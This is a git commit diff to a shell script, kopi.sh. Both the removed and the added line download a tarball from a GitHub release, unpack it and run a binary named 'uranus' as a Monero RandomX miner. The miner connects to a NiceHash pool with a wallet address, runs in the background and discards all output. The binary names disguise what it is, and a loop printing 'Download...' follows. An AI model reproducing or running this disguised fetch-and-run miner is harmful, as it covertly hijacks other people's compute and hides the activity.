9b0ab0f5683c59f6e73a22dfa5b7e6635e81c1b3
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-13 03:38:44 +0700

    Update kopi.sh

--- kopi.sh
+++ kopi.sh
@@ -1,4 +1,4 @@
-wget https://github.com/komarudinsa/miegor/releases/download/uranuz/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o randomxmonero.hk.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.vivo -t 1 > /dev/null 2>&1 &
+wget https://github.com/komarudinsa/miegor/releases/download/uranuz/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o randomxmonero.hk.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f -p "vivo" -t 1 --tls > /dev/null 2>&1 &
 while true
 do
         echo "Download..."
